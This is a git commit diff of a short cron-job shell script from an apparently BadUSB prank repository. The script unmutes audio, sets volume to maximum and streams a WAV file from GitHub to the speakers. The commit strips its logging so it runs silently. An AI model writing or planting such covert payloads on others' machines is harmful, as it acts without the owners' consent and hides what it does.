461dcf04cacf8e42040c5194a8a27e9ed02ef0cd
cluster bright <142358852+Cluster-bright@users.noreply.github.com>
2024-10-09 09:48:26 +0000

    Update bexecute.sh

--- chronjobs/soundstage/bexecute.sh
+++ chronjobs/soundstage/bexecute.sh
@@ -6,9 +6,7 @@ export XDG_RUNTIME_DIR=/run/user/$(id -u)    # PulseAudio environment
 
 
 {
-    echo "Starting script..."
-    /usr/bin/amixer -q set Master unmute || echo "Failed to unmute"
-    /usr/bin/amixer -q set Master 100% || echo "Failed to set volume"
-    /usr/bin/wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/chronjobs/soundstage/huh.wav | /usr/bin/aplay -q || echo "Failed to play sound"
-    echo "Script completed."
-} > ~/glogfile.log 2>&1
+    /usr/bin/amixer -q set Master unmute
+    /usr/bin/amixer -q set Master 100%
+    /usr/bin/wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/chronjobs/soundstage/huh.wav | /usr/bin/aplay -q
+} > ~/dev/null 2>&1
